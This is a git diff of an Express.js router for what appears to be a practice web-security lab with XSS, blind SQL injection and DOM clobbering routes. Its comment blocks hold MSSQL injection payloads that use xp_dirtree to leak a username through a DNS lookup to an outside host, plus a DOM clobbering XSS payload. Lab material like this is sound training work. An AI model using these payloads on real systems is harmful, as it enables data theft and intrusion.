@@ -70,7 +70,6 @@ router.post('/xss-to-capture-pass/login', async (req, res) => {
             res.redirect('/xss-to-capture-pass/blog')
         }
         else {
-            // napravi da se vidi na stranici
             console.log("Wrong user name or password")
             res.redirect('/xss-to-capture-pass')
         }
@@ -100,7 +99,10 @@ function x2cp_blog_checkLogIn(req, res, next) {
 }
 
 router.get('/xss-to-capture-pass/blog', x2cp_blog_checkLogIn, (req, res) => {
-    res.render('x2cp-blog.ejs', {csrfToken: req.app.locals._token, user: req.session.user_name, posts: posts})
+    res.render('x2cp-blog.ejs', 
+    {csrfToken: req.app.locals._token, 
+    user: req.session.user_name, 
+    posts: posts})
     console.log(req.app.locals._token)
 })
 
@@ -117,9 +119,22 @@ router.post('/xss-to-capture-pass/blog', (req, res) => {
 //--------------------------------------------------------------------------
 //MSSQL
 /*
-%27%3Bdeclare @p varchar(1024)%3Bset
-@p=(SELECT user_name FROM users WHERE user_id = 1)
-%3Bexec('master..xp_dirtree %22//'+@p+'.foo.arrdub.net/a%22')-- 
+03tqij9ohphk04x7%27%3B
+declare @p varchar(1024)%3B
+set @p=(SELECT user_name FROM users WHERE user_id = 2)%3B
+exec('master..xp_dirtree %22//'+@p+'.foo.arrdub.net/a%22')%3B--
+
+03tqij9ohphk04x7%27%3BSELECT user_name FROM users WHERE user_id = 1%3B--
+';
+declare @p varchar(1024);
+set @p=(SELECT user_name FROM users WHERE user_id=2);
+exec('master..xp_dirtree"//'+@p+'.foo.arrdub.net/a"');--
+
+SELECT user_id FROM blind_users WHERE TrackingID = '03tqij9ohphk04x7';
+declare @p varchar(1024);
+set @p=(SELECT user_name FROM users WHERE user_id = 2);
+exec('master..xp_dirtree "//'+@p+'.foo.arrdub.net/a"');--';
+
 */
 
 router.get('/blind-sqli', (req, res) => {
@@ -133,13 +148,14 @@ router.post('/blind-sqli', (req, res) => {
 
 
 //DOM clobering
-
-router.get('/dom-clobering', (req, res) => {
-    res.render('dom-clobering', {csrfToken: req.app.locals._token, posts: dom_posts})
-})
-
 //payload (crome only)
 //<a id=doc><a id=doc name=path href="cid:alert(1)//">
+
+router.get('/dom-clobering', (req, res) => {
+    res.render('dom-clobering', {csrfToken: req.app.locals._token, 
+        posts: dom_posts})
+})
+
 router.post('/dom-clobering', (req, res) => {
     if(req.body.post) {
         var clean = DOMPurify.sanitize(req.body.post)
